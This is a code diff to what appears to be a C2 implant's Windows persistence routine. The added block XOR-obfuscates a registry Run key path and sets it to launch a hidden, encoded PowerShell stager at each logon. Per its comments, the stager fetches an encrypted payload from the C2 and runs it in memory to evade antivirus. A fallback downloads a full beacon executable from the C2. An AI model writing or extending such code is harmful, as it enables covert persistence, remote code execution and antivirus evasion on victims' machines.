@@ -29,9 +29,34 @@ inline std::string establish_windows(const net::C2Config& cfg, const std::string
     }
 
     std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
-    std::string exePath = dir + "\\" + name + ".exe";
-
     CreateDirectoryA(dir.c_str(), NULL);
+
+    // ── Strategy 1: NO-DISK persistence (preferred) ────────────────────
+    // The RunKey relaunches the compact PowerShell stager (embedded at
+    // build time). At next logon: powershell downloads the XOR PIC from
+    // /x and executes it in-memory — no EXE ever touches the disk, the
+    // exact path that field-testing proved survives real-time AV.
+#ifdef C2_HAS_PS_STAGER
+    {
+        HKEY hKey = NULL;
+        if (RegCreateKeyExA(HKEY_CURRENT_USER,
+                XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
+                0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            std::string runCmd = std::string("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ")
+                + C2_PS_STAGER_B64;
+            if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
+                    (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
+                RegCloseKey(hKey);
+                return std::string("Persist established (no-disk): RunKey ")
+                    + name + " -> powershell stager (in-memory rebirth at logon)";
+            }
+            RegCloseKey(hKey);
+        }
+    }
+#endif
+
+    // ── Strategy 2 (fallback): classic PE on disk + self-hollow ────────
+    std::string exePath = dir + "\\" + name + ".exe";
 
     // Download full beacon PE from C2
     std::string payload = net::http_request(cfg,
